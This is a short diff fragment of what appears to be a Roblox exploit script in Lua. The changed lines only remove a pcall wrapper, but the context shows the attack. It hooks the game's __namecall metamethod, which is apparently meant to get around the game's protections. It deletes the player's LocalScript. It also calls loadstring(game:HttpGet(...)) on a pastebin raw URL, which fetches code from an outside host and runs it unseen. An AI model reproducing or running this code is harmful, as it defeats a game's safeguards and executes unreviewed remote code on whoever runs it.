@@ -1,4 +1,3 @@
-pcall(function()    
         LPH_JIT_MAX(function() 
                 local old
                 old = hookmetamethod(game, "__namecall", function(...)
@@ -36,4 +35,3 @@ pcall(function()
         game.Players.LocalPlayer.PlayerScripts:FindFirstChild("LocalScript"):Destroy()
         end
         loadstring(game:HttpGet("https://pastebin.com/raw/BMGbkQ71"))();
-end)
